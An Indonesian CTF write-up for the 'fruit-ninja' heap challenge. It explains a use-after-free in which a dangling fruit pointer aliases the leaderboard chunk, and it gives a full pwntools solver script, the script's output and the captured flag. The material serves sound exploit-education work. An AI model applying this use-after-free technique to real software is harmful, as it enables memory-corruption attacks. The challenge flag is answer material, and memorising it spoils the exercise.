# WriteUp - fruit-ninja

## Overview
- **Judul:** fruit-ninja
- **Kategori:** Pwn / Heap Exploitation (Use-After-Free)
- **Poin:** 300
- **Author:** Aterlone
- **Akses:** `nc chals.vuwctf.com 9978`
- **Deskripsi:** Welcome to Fruit Ninja! Slice fruits to earn points and become the ultimate fruit ninja master! Can you exploit the heap to achieve victory?

## Informasi File
Berdasarkan hasil analisis *binary* menggunakan `file` dan `checksec`:
* **Arsitektur:** ELF 64-bit LSB
* **Proteksi:** 
  * NX (No-eXecute) *Enabled*
  * PIE (Position Independent Executable) *Enabled*
  * Stack Canary *Enabled*
  * Full RELRO *Enabled*

## Analisis Kerentanan
Program ini memiliki kerentanan **Use-After-Free (UAF)** yang berujung pada eksploitasi **Heap Aliasing** (Tcache/Fastbin chunk overlap). Berikut rincian kelemahan pada logika memori program:

1. **Dangling Pointer pada `throw_away_fruit()`:**
   Fungsi ini dipanggil untuk membuang buah dari keranjang menggunakan `free(ptr)` dan mengurangi `fruit_count`. Namun, program **tidak** membersihkan *pointer* di dalam array `fruit_basket[v1]` menjadi `NULL`. *Pointer* tersebut masih menunjuk ke *chunk* memori yang sudah dikembalikan ke sistem *heap* (*dangling pointer*).

2. **UAF Write pada `edit_fruit()`:**
   Fungsi ini mengizinkan modifikasi nama buah selama *pointer* `fruit_basket[v1]` tidak *null*. Karena keberadaan *dangling pointer* dari kelemahan pertama, kita dapat mengedit data memori yang sudah di-`free`.

3. **Heap Aliasing / Overlapping Chunks:**
   Fungsi `reset_leaderboard()` mengalokasikan memori baru untuk `leaderboard` dengan ukuran `malloc(0x24)`. Ukuran alokasi ini identik dengan ukuran alokasi pembuatan buah baru di fungsi `slice_fruit()`. Sistem manajemen *heap* pada Linux (glibc) memiliki mekanisme *Last-In-First-Out* (LIFO) untuk *chunk* berukuran kecil pada *Tcache* atau *Fastbin*. 
   
   Jika kita membebaskan (*free*) sebuah buah berukuran `0x24`, *chunk* tersebut akan diletakkan di daftar *heap* bebas. Saat kita langsung memanggil `reset_leaderboard()` yang meminta alokasi sebesar `0x24`, sistem *heap* akan memberikan ulang *chunk* dari buah yang baru saja dibebaskan tadi. Hasilnya, variabel global `leaderboard` dan *dangling pointer* pada `fruit_basket[0]` kini menunjuk ke alamat memori fisik yang **sama persis**.

## Proses Penyelesaian
1. **Buat Buah:** Alokasikan satu buah menggunakan menu `1` (`slice_fruit`). Buah ini akan menempati `fruit_basket[0]` di memori *heap*.
2. **Buang Buah (Free):** Hapus buah pada indeks `0` menggunakan menu `2` (`throw_away_fruit`). *Chunk* dikembalikan ke *heap bin*, tetapi `fruit_basket[0]` tetap menyimpan alamatnya.
3. **Picu Aliasing:** Gunakan menu `6` (`reset_leaderboard()`). Alokasi `malloc(0x24)` akan menggunakan ulang *chunk* dari `fruit_basket[0]`. Kini `leaderboard` membagikan *chunk* yang sama dengan `fruit_basket[0]`.
4. **Manipulasi Data (UAF Write):** Gunakan menu `4` (`edit_fruit`) untuk mengedit indeks `0`. Ubah namanya menjadi `Admin`. Karena memorinya berbagi dengan variabel `leaderboard`, nilai `leaderboard` secara otomatis berubah menjadi `Admin`.
5. **Dapatkan Flag:** Panggil menu `5` (`perform_special_action()`). Kondisi `strcmp(leaderboard, "Admin")` sekarang bernilai benar, memicu fungsi `win_game()` untuk membaca dan mencetak isi `flag.txt`.

## Script Solver
```python
#!/usr/bin/env python3
from pwn import *

def solve():
    host = "chals.vuwctf.com"
    port = 9978
    
    log.info(f"Connecting to {host}:{port}...")
    r = remote(host, port)
    
    def slice_fruit(name, points):
        r.sendlineafter(b"Choice: ", b"1")
        r.sendlineafter(b"Enter fruit name (max 31 chars): ", name)
        r.sendlineafter(b"Enter points for this fruit: ", str(points).encode())
        
    def throw_away(idx):
        r.sendlineafter(b"Choice: ", b"2")
        r.sendlineafter(b"Enter index of fruit to throw away", str(idx).encode())
        
    def reset_leaderboard():
        r.sendlineafter(b"Choice: ", b"6")
        
    def edit_fruit(idx, name):
        r.sendlineafter(b"Choice: ", b"4")
        r.sendlineafter(b"Enter index of fruit to edit", str(idx).encode())
        r.sendlineafter(b"Enter new fruit name (max 31 chars): ", name)
        
    def special_action():
        r.sendlineafter(b"Choice: ", b"5")

    log.info("1. Allocating fruit 0...")
    slice_fruit(b"apple", 100)
    
    log.info("2. Freeing fruit 0 (creating dangling pointer)...")
    throw_away(0)
    
    log.info("3. Resetting leaderboard to trigger Heap Aliasing...")
    reset_leaderboard()
    
    log.info("4. Overwriting shared chunk with 'Admin' via UAF...")
    edit_fruit(0, b"Admin")
    
    log.info("5. Triggering win_game()...")
    special_action()
    
    r.interactive()

if __name__ == "__main__":
    solve()
```

## Output Eksekusi
```text
 󰋑  ▶  ./exploit.py
[*] Connecting to chals.vuwctf.com:9978...
[+] Opening connection to chals.vuwctf.com on port 9978: Done
[*] 1. Allocating fruit 0...
[*] 2. Freeing fruit 0 (creating dangling pointer)...
[*] 3. Resetting leaderboard to trigger Heap Aliasing...
[*] 4. Overwriting shared chunk with 'Admin' via UAF...
[*] 5. Triggering win_game()...
[*] Switching to interactive mode
5
Welcome!

Flag: VuwCTF{fr33_th3_h34p_sl1c3_th3_fr00t}


=== Fruit Ninja Menu ===
1. Slice a fruit (malloc)
2. Throw away fruit (free)
3. View sliced fruits
4. Edit fruit name
5. Perform special action
6. Reset leaderboard
7. Exit
Choice: $
[*] Interrupted
[*] Closed connection to chals.vuwctf.com port 9978
```

## Flag
```text
VuwCTF{fr33_th3_h34p_sl1c3_th3_fr00t}
```
